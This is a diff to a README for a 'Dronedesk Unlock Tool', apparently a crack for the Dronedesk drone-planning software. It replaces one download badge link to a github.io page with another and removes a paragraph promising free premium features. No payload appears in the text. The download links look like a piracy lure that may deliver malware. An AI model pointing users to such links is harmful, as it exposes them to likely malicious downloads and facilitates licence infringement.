@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡ Dronedesk Unlock Tool</h1>
 
-<p align="center">
-  <a href="https://dronedesk-free-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20Dronedesk%20Unlock%20Tool-Enable%20All%20Features-1E90FF?style=for-the-badge&logo=drone&logoColor=white" 
-         alt="Download Dronedesk Unlock Tool" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://asherburnshkma.github.io/.github/dronedesk-tool)
 
 <!-- Tool Preview -->
 <p align="center">
@@ -91,13 +86,6 @@ Licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 ## 📚 Support and Contribution
 
 Report bugs or contribute via Issues or Pull Requests.
-
----
-
-## ⭐ Unlock Dronedesk – Drone Flight Planning & Compliance Software
-
-Unlock all Dronedesk premium features including advanced flight planning, compliance management, and professional reporting.  
-[Download the Unlock Tool](https://dronedesk-free-download.github.io/.github/) and streamline your drone operations today.
 
 ---
 
